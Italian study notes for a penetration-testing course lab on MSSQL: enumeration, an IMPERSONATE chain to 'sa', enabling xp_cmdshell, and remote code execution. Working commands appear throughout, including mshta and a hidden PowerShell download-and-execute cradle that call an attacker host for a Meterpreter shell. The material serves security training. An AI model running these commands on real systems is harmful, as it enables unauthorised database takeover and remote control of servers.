# 022 — MSSQL DB User Impersonation to RCE (Network Penetration Testing)

> **Modulo:** Network Penetration Testing · **Video:** 22/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [022_MSSQL_DB_User_Impersonation_to_RCE.mp4.txt](022_MSSQL_DB_User_Impersonation_to_RCE.mp4.txt) · [022_MSSQL_DB_User_Impersonation_to_RCE.mp4.srt](022_MSSQL_DB_User_Impersonation_to_RCE.mp4.srt)

## Concetti chiave

- **MSSQL** (Microsoft SQL Server) gira su **TCP 1433** (default).
- Catena attacco: **enum versione → login low-priv → cerca permission `IMPERSONATE` → impersonate `sa` (sysadmin) → enable `xp_cmdshell` → RCE via HTA**.
- **`sa`** = system administrator MSSQL (equivalente di root/Domain Admin per il DB).
- **`xp_cmdshell`** = stored procedure che esegue comandi shell Windows → RCE.
- **`EXECUTE AS LOGIN = 'sa'`** = token-impersonation a livello DB (richiede permission `IMPERSONATE`).
- Esecuzione comandi → callback meterpreter via **`exploit/windows/misc/hta_server`** Metasploit.

## Spiegazione approfondita

### Step 1 — Discovery e versioning
```bash
sudo nmap -sV -p 1433 demo.ine.local
# 1433/tcp open ms-sql-s Microsoft SQL Server 2019 RTM

sudo nmap -p 1433 --script ms-sql-info demo.ine.local
# Version: Microsoft SQL Server 2019 RTM
# Post-SP patches applied: false
# Service back-level: RTM
```

Altri NSE utili:
- `ms-sql-ntlm-info` → leak hostname/domain
- `ms-sql-brute` → brute login
- `ms-sql-empty-password` → check `sa` no pwd
- `ms-sql-xp-cmdshell` → esegue cmd se già autenticato
- `ms-sql-dump-hashes` → dump password hash MSSQL

### Step 2 — Login con creds note (Bob / dato lab)
```bash
impacket-mssqlclient bob:<password>@demo.ine.local
# SQL>
```

### Step 3 — Enum versione DB lato SQL
```sql
SELECT @@version;
-- Microsoft SQL Server 2019 (RTM) 64-bit · Windows Server 2016
```

### Step 4 — Verifica ruolo sysadmin
```sql
SELECT name, IS_SRVROLEMEMBER('sysadmin', name) AS is_sysadmin
FROM sys.server_principals
WHERE type IN ('S','U','G');

-- Quick test
SELECT IS_SRVROLEMEMBER('sysadmin');     -- 0 = non sysadmin
SELECT loginname FROM master..syslogins WHERE sysadmin = 1;
-- Output: sa (solo sa è sysadmin)
```
Bob NON è sysadmin → non può eseguire `xp_cmdshell` direttamente.

### Step 5 — Tenta `xp_cmdshell` (fallisce)
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-- → permission denied
```

### Step 6 — Cerca utenti impersonabili
```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
-- Output: sa, dbuser
```

### Step 7 — Catena di impersonation
Bob non può impersonare `sa` direttamente, ma può impersonare `dbuser`. `dbuser` può impersonare `sa`. Chain:

```sql
-- Da bob: prova sa (fallisce)
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
-- Cannot execute as the server principal because the principal "sa" does not exist...

REVERT;

-- Da bob: impersona dbuser
EXECUTE AS LOGIN = 'dbuser';
SELECT SYSTEM_USER;            -- dbuser

-- Da dbuser: impersona sa
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;            -- sa  ✓
```

### Step 8 — Abilita `xp_cmdshell`
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Step 9 — Test RCE
```sql
EXEC xp_cmdshell 'whoami';
-- nt service\mssql$... (service account)
```

### Step 10 — RCE → Meterpreter via HTA server
In un altro terminale Kali:
```
msf6 > use exploit/windows/misc/hta_server
msf6 > set LHOST <kali_ip>
msf6 > exploit -j
# → URL: http://<kali>:8080/<random>.hta
```

Dal client MSSQL:
```sql
EXEC xp_cmdshell 'mshta.exe http://<kali>:8080/abcd1234.hta';
```

Sul listener Metasploit appare meterpreter session:
```
msf6 > sessions -i 1
meterpreter > sysinfo
meterpreter > getuid            # NT SERVICE\MSSQL$...
meterpreter > getprivs           # SeImpersonatePrivilege → JuicyPotato/PrintSpoofer per SYSTEM
```

### Privilege escalation post-RCE
Service account MSSQL ha tipicamente **`SeImpersonatePrivilege`** → **Potato attacks** (JuicyPotato, RoguePotato, PrintSpoofer, GodPotato) → escalation a `NT AUTHORITY\SYSTEM`. Vedi modulo Privilege Escalation.

## Comandi & strumenti

| Tool | Scopo | Esempio |
|---|---|---|
| `nmap -p 1433 --script ms-sql-info` | Versione MSSQL | |
| `nmap -p 1433 --script ms-sql-brute` | Brute login | |
| `nmap -p 1433 --script ms-sql-empty-password` | sa senza pwd | |
| `impacket-mssqlclient user:pass@<target>` | MSSQL client | `-windows-auth` per Win auth |
| `impacket-mssqlclient -windows-auth ...` | Kerberos/NTLM auth | |
| `SELECT @@version` | Versione DB | |
| `SELECT IS_SRVROLEMEMBER('sysadmin')` | Check sysadmin | |
| `SELECT loginname FROM syslogins WHERE sysadmin=1` | Lista sysadmin | |
| `sys.server_permissions` + `IMPERSONATE` | Trova target impersonabili | |
| `EXECUTE AS LOGIN = '<user>'` | Token impersonation | |
| `REVERT` | Torna al login originale | |
| `EXEC sp_configure 'xp_cmdshell', 1` | Abilita RCE | richiede sysadmin |
| `EXEC xp_cmdshell '<cmd>'` | Esegue comando shell | |
| `exploit/windows/misc/hta_server` (msf) | Genera HTA payload | |
| `mshta.exe http://...` | Esegue HTA → meterpreter | |

## Esempi pratici

```bash
# 1. Recon
sudo nmap -sV -p 1433 --script "ms-sql-*" demo.ine.local

# 2. Login
impacket-mssqlclient bob:'Pass123!'@demo.ine.local
```

```sql
-- 3. Discovery permission
SELECT @@version;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT loginname FROM master..syslogins WHERE sysadmin=1;
SELECT DISTINCT b.name FROM sys.server_permissions a
  JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
  WHERE a.permission_name='IMPERSONATE';

-- 4. Impersonation chain
EXECUTE AS LOGIN='dbuser';
EXECUTE AS LOGIN='sa';
SELECT SYSTEM_USER;

-- 5. Enable xp_cmdshell
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

-- 6. RCE
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'mshta.exe http://10.10.x.x:8080/abc.hta';
```

```
# 7. Listener HTA
msf6 > use exploit/windows/misc/hta_server
msf6 > set LHOST <kali>
msf6 > exploit -j
```

Nota extra: alternativa a HTA → PowerShell one-liner:
```sql
EXEC xp_cmdshell 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://<kali>/sh.ps1'')"';
```

## Punti d'attenzione per l'esame eCPPT

- **MSSQL porta 1433** TCP (memorizzare).
- **`sa`** = sysadmin di default su MSSQL.
- **`xp_cmdshell`** = stored procedure per RCE; richiede ruolo **sysadmin** o impersonation chain.
- **`EXECUTE AS LOGIN='<user>'`** + **`REVERT`** = token impersonation a livello DB.
- Permission da cercare: **`IMPERSONATE`** in `sys.server_permissions`.
- **Service account MSSQL** ha tipicamente **SeImpersonatePrivilege** → Potato attacks per SYSTEM.
- Tool standard: **`impacket-mssqlclient`** (Linux), **HeidiSQL/SSMS** (Windows).
- NSE per discovery: **`ms-sql-info`**, **`ms-sql-brute`**, **`ms-sql-empty-password`**, **`ms-sql-xp-cmdshell`**.
- **HTA server** modulo: `exploit/windows/misc/hta_server` → `mshta.exe URL` per fetch + exec.
- Differenza tra ruolo `sysadmin` (fixed server role) e gruppo Windows local Administrators.
- `IS_SRVROLEMEMBER('sysadmin')` = 0/1 quick check.

## Collegamenti con altri video

- Precedente: [[021_SMB_Relay_Attack.mp4]]
- Prossimo: [[023_Linux_Black-Box_Penetration_Test.mp4]]
- Privilege escalation su SeImpersonatePrivilege: modulo Privilege Escalation (Potato attacks).
- Hash dump post-access: [[024_Dumping___Cracking_NTLM_Hashes.mp4]]
- Lab post-ex: [[025_Windows_Post-Exploitation_Lab.mp4]]
